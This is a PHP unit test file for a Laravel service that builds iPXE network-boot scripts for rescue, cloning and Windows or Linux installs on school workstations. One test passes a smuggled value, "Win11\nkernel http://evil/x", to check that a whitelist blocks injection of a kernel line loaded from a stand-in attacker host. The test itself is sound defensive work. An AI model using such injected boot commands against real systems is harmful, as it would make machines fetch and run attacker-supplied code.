<?php

declare(strict_types=1);

namespace Tests\Unit\Ipxe\Services;

use App\Ipxe\Enums\IpxeAdminAction;
use App\Ipxe\Services\IpxeActionResolver;
use App\Models\Workstation;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Config;
use PHPUnit\Framework\Attributes\Test;
use Tests\Support\IpxeSchemaBootstrapper;
use Tests\TestCase;

/**
 * Story 3.2 — AC1.2 / T1.6.
 *
 * Tests unitaires du résolveur d'actions whitelistées
 * {@see IpxeActionResolver}.
 */
class IpxeActionResolverTest extends TestCase
{
    private IpxeActionResolver $resolver;

    protected function setUp(): void
    {
        parent::setUp();
        IpxeSchemaBootstrapper::bootstrap();
        $this->resolver = $this->app->make(IpxeActionResolver::class);
    }

    private function makeRequest(array $params = []): Request
    {
        // URL absolue : `Request::create('/ipxe/...')` parserait avec
        // `http://localhost` et un `server->set('HTTP_HOST', ...)` ultérieur
        // ne propage pas au headers bag — `getSchemeAndHttpHost()` resterait
        // localhost. On passe l'host directement dans l'URL pour qu'il soit
        // cohérent sur server + headers + parsed-host.
        $request = Request::create('http://se4fs.lan/ipxe/action/rescuecd', 'POST', $params);
        $request->server->set('REMOTE_ADDR', '192.168.1.42');

        return $request;
    }

    #[Test]
    public function it_renders_rescuecd_with_kernel_sysresccd_url(): void
    {
        Config::set('ipxe.actions.os_url', 'http://se4fs.test/ipxe');
        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, null, $request);

        self::assertStringStartsWith('#!ipxe', $body);
        self::assertStringContainsString('kernel http://se4fs.test/ipxe/sysresccd/boot/x86_64/vmlinuz', $body);
        self::assertStringContainsString('archisobasedir=sysresccd', $body);
        self::assertStringContainsString('initrd --name intel_ucode.img', $body);
        self::assertStringContainsString('initrd --name amd_ucode.img', $body);
        self::assertStringContainsString('initrd --name initram.igz', $body);
        self::assertStringEndsWith("boot\n", $body);
    }

    #[Test]
    public function it_renders_winpe_with_wimboot_and_4_initrds(): void
    {
        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Winpe, null, $request);

        self::assertStringStartsWith('#!ipxe', $body);
        self::assertStringContainsString('kernel Win10/wimboot', $body);
        self::assertStringContainsString('initrd --name winpeshl.ini', $body);
        self::assertStringContainsString('initrd --name install.bat Win10/repair.bat.php##params', $body);
        self::assertStringContainsString('initrd --name diskpart.txt Win10/diskpart.php##params', $body);
        self::assertStringContainsString('initrd --name boot.wim', $body);
        // 2 blocs `params` + 2 `iseq ${platform} efi && param bios uefi || param bios legacy`.
        self::assertSame(2, substr_count($body, 'iseq ${platform} efi && param bios uefi || param bios legacy'));
        self::assertSame(2, substr_count($body, "params\n"));
        self::assertStringEndsWith("boot\n", $body);
    }

    #[Test]
    public function it_renders_factory_reset_with_clonezilla_kernel_and_restoreparts(): void
    {
        Config::set('ipxe.actions.os_url', 'http://se4fs.test/ipxe');
        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::FactoryReset, null, $request);

        self::assertStringStartsWith('#!ipxe', $body);
        self::assertStringContainsString('kernel http://se4fs.test/ipxe/clonezilla/vmlinuz', $body);
        self::assertStringContainsString('ocs_prerun="mount -t auto /dev/sda2 /home/partimag/"', $body);
        self::assertStringContainsString('ocs_live_run="ocs-sr -e1 auto -e2 -r -j2 -p reboot restoreparts savesda1 sda1"', $body);
        self::assertStringContainsString('fetch=http://se4fs.test/ipxe/clonezilla/filesystem.squashfs', $body);
        self::assertStringContainsString('initrd --name initram.igz http://se4fs.test/ipxe/clonezilla/initrd.img', $body);
        self::assertStringEndsWith("boot\n", $body);
    }

    #[Test]
    public function it_injects_se4install_passwd_from_config_for_rescuecd(): void
    {
        Config::set('sambaedu.se4install_passwd', 's3cr3t-test-pass');
        Config::set('ipxe.actions.os_url', 'http://se4fs.test/ipxe');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, null, $request);

        self::assertStringContainsString('rootpass=s3cr3t-test-pass', $body);
    }

    #[Test]
    public function it_resolves_os_url_from_config_when_set(): void
    {
        Config::set('ipxe.actions.os_url', 'http://override.example/ipxe');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, null, $request);

        self::assertStringContainsString('http://override.example/ipxe/sysresccd/boot/x86_64/vmlinuz', $body);
        // L'host de la request doit être ignoré quand override.
        self::assertStringNotContainsString('http://se4fs.lan/ipxe/sysresccd', $body);
    }

    #[Test]
    public function it_resolves_os_url_from_request_scheme_and_host_when_config_empty(): void
    {
        Config::set('ipxe.actions.os_url', null);

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, null, $request);

        // Doit utiliser se4fs.lan (from HTTP_HOST) suffixé /ipxe.
        self::assertStringContainsString('http://se4fs.lan/ipxe/sysresccd', $body);
    }

    #[Test]
    public function it_sanitizes_ascii_in_workstation_name_and_uuid(): void
    {
        Config::set('ipxe.actions.os_url', 'http://se4fs.test/ipxe');

        $ws = Workstation::create([
            'name' => "PC-ECOLE\xc3\xa9-101",  // contient `é` UTF-8
            'uuid' => '12345678-1234-1234-1234-123456789abc',
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'status' => 'active',
        ]);

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, $ws, $request);

        // Tous les bytes doivent être ASCII (0-127).
        for ($i = 0, $len = strlen($body); $i < $len; $i++) {
            self::assertLessThan(128, ord($body[$i]));
        }
    }

    /* ------------------------------------------------------------------
     * Story 3.2 — Correctif review #2 / #B2 (whitelist version winpe)
     * ------------------------------------------------------------------ */

    #[Test]
    public function it_rejects_invalid_version_and_falls_back_to_default(): void
    {
        // Fix review #B2 — test injection iPXE. Sans whitelist, le firmware
        // exécutait la ligne `kernel http://evil/x` injectée via newline.
        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
            'version' => "Win11\nkernel http://evil/x",
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Winpe, null, $request);

        // Le body NE DOIT PAS contenir la ligne kernel attaquante.
        self::assertStringNotContainsString('kernel http://evil', $body);
        self::assertStringNotContainsString("\nkernel http://evil/x", $body);
        // Le body DOIT contenir le fallback DEFAULT_WIN_VERSION='Win11' pur.
        self::assertStringContainsString('initrd --name BCD Win11/boot/bcd', $body);
        self::assertStringContainsString('initrd --name boot.wim Win11/sources/boot.wim', $body);
    }

    #[Test]
    public function it_accepts_whitelisted_version(): void
    {
        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
            'version' => 'Win10',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Winpe, null, $request);

        // Win10 doit être propagé tel quel dans le template winpe.
        self::assertStringContainsString('param version Win10', $body);
        self::assertStringContainsString('initrd --name BCD Win10/boot/bcd', $body);
        self::assertStringContainsString('initrd --name boot.wim Win10/sources/boot.wim', $body);
    }

    #[Test]
    public function it_builds_autorun_url_with_mac_and_uuid_interpolated(): void
    {
        Config::set('ipxe.actions.script_url', 'http://script.example/ipxe');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, null, $request);

        self::assertStringContainsString(
            'ar_source=http://script.example/ipxe/sysrescuecd/autorun.php?mac=aa%3Abb%3Acc%3Add%3Aee%3Aff&uuid=12345678-1234-1234-1234-123456789abc',
            $body,
        );
    }

    /* ------------------------------------------------------------------
     * Story 3.5 — AC6.2 / AC7.1 — resolveWindowsVariables() + templates.
     * ------------------------------------------------------------------ */

    #[Test]
    public function it_resolves_install_win11_with_wimboot_kernel(): void
    {
        Config::set('ipxe.actions.script_url', 'http://se4fs.lan');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-aaaaaaaaaaaa',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::InstallWin11, null, $request);

        self::assertStringStartsWith('#!ipxe', $body);
        // Kernel iso-legacy `wimboot11.php:6`.
        self::assertStringContainsString('kernel Win10/wimboot', $body);
        // Initrd winpeshl + install.bat + unattend.xml.
        self::assertStringContainsString('initrd --name winpeshl.ini', $body);
        self::assertStringContainsString('initrd --name install.bat', $body);
        self::assertStringContainsString('initrd --name unattend.xml', $body);
        // URLs natives 3.5.
        self::assertStringContainsString('/ipxe/windows/install.bat##params', $body);
        self::assertStringContainsString('/ipxe/windows/unattend.xml##params', $body);
        // Win11 assets paths.
        self::assertStringContainsString('initrd --name BCD Win11/boot/bcd', $body);
        self::assertStringContainsString('initrd --name boot.wim Win11/sources/boot.wim', $body);
        // Params section.
        self::assertStringContainsString('param version Win11', $body);
        self::assertStringContainsString('param action wimboot11', $body);
        self::assertStringContainsString('param debug 0', $body);
        self::assertStringContainsString('param disk 0', $body);
        self::assertStringContainsString('param perso 0', $body);
        // Termine par boot.
        self::assertStringContainsString("boot\n", $body);
    }

    #[Test]
    public function it_resolves_install_win10_debug_with_debug_flag_1(): void
    {
        Config::set('ipxe.actions.script_url', 'http://se4fs.lan');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-bbbbbbbbbbbb',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::InstallWin10Debug, null, $request);

        self::assertStringContainsString('param version Win10', $body);
        self::assertStringContainsString('param action wimboot10', $body);
        self::assertStringContainsString('param debug 1', $body);
        self::assertStringContainsString('initrd --name BCD Win10/boot/bcd', $body);
    }

    #[Test]
    public function it_resolves_install_win11_disk_with_disk_flag_1(): void
    {
        Config::set('ipxe.actions.script_url', 'http://se4fs.lan');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-cccccccccccc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::InstallWin11Disk, null, $request);

        self::assertStringContainsString('param disk 1', $body);
        self::assertStringContainsString('param version Win11', $body);
    }

    #[Test]
    public function it_resolves_install_win10_perso_with_perso_flag_1(): void
    {
        Config::set('ipxe.actions.script_url', 'http://se4fs.lan');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-dddddddddddd',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::InstallWin10Perso, null, $request);

        self::assertStringContainsString('param perso 1', $body);
        self::assertStringContainsString('param version Win10', $body);
    }

    #[Test]
    public function it_does_not_set_windows_variables_for_linux_actions(): void
    {
        // Non-régression 3.4 : InstallDebGnome n'expose pas $windowsVersion.
        // On vérifie qu'aucune section Win-specific n'apparaît.
        Config::set('ipxe.actions.script_url', 'http://se4fs.lan');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-eeeeeeeeeeee',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::InstallDebGnome, null, $request);

        // Pas de bcd/boot.wim/wimboot (= Windows).
        self::assertStringNotContainsString('Win10/wimboot', $body);
        self::assertStringNotContainsString('boot.wim', $body);
        // Présence des marqueurs Linux (non-régression).
        self::assertStringContainsString('debian-installer', $body);
    }

    /**
     * Post-review #5 — cohérence `resolveServerBaseUrl()` entre `IpxeService`
     * et `IpxeActionResolver`. Si Henri pose `IPXE_SE4FS_URL=http://proxy.lan`
     * (ou `config('ipxe.se4fs_url')`), les deux résolveurs doivent retourner
     * la MÊME URL — sinon les templates des outils diagnostic (gparted, hdt,
     * memtest) auraient des chemins kernel cassés en prod.
     *
     * On exerce le comportement via `IpxeActionResolver::resolve()` (la
     * propriété `serverBaseUrl` apparaît dans `gparted.blade.php` ligne
     * `kernel http://proxy.lan/bin/gparted/...`), et on observe le préfixe
     * URL. La cohérence côté `IpxeService` est garantie par lecture de la
     * MÊME clé `ipxe.se4fs_url`.
     */
    #[Test]
    public function it_uses_canonical_ipxe_se4fs_url_for_server_base_url(): void
    {
        Config::set('ipxe.se4fs_url', 'http://proxy.lan');
        Config::set('ipxe.actions.server_base_url', ''); // legacy clé vide.

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-aaaa00000000',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Gparted, null, $request);

        self::assertStringContainsString(
            'http://proxy.lan/',
            $body,
            '`IpxeActionResolver` doit honorer `ipxe.se4fs_url` (clé canonique unifiée — fix review #5).',
        );
        // Sanity : on ne tombe pas sur le fallback `http://se4fs`.
        self::assertStringNotContainsString('http://se4fs/', $body);
    }

    /**
     * Post-review #5 — fallback deprecated `ipxe.actions.server_base_url`
     * tolère encore les déploiements qui auraient configuré l'ancienne clé
     * (compat descendante). À retirer en Phase 3.
     */
    #[Test]
    public function it_falls_back_to_legacy_actions_server_base_url_when_canonical_empty(): void
    {
        Config::set('ipxe.se4fs_url', '');
        Config::set('ipxe.actions.server_base_url', 'http://legacy-proxy.lan');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-aaaa00000000',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Gparted, null, $request);

        self::assertStringContainsString('http://legacy-proxy.lan/', $body);
    }

    #[Test]
    public function it_renders_install_win11_template_with_all_7_blade_files(): void
    {
        // Garde-fou : les 7 templates install_win* existent et rendent
        // sans erreur Blade.
        Config::set('ipxe.actions.script_url', 'http://se4fs.lan');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-aaaa00000000',
        ]);

        $cases = [
            IpxeAdminAction::InstallWin10,
            IpxeAdminAction::InstallWin10Debug,
            IpxeAdminAction::InstallWin10Disk,
            IpxeAdminAction::InstallWin10Perso,
            IpxeAdminAction::InstallWin11,
            IpxeAdminAction::InstallWin11Disk,
            IpxeAdminAction::InstallWin11Perso,
        ];

        foreach ($cases as $action) {
            $body = $this->resolver->resolve($action, null, $request);
            self::assertStringStartsWith('#!ipxe', $body, "Template {$action->value} ne commence pas par #!ipxe");
            self::assertStringContainsString('kernel Win10/wimboot', $body, "Template {$action->value} : kernel manquant");
            self::assertStringContainsString("boot\n", $body, "Template {$action->value} : pas de boot final");
        }
    }
}
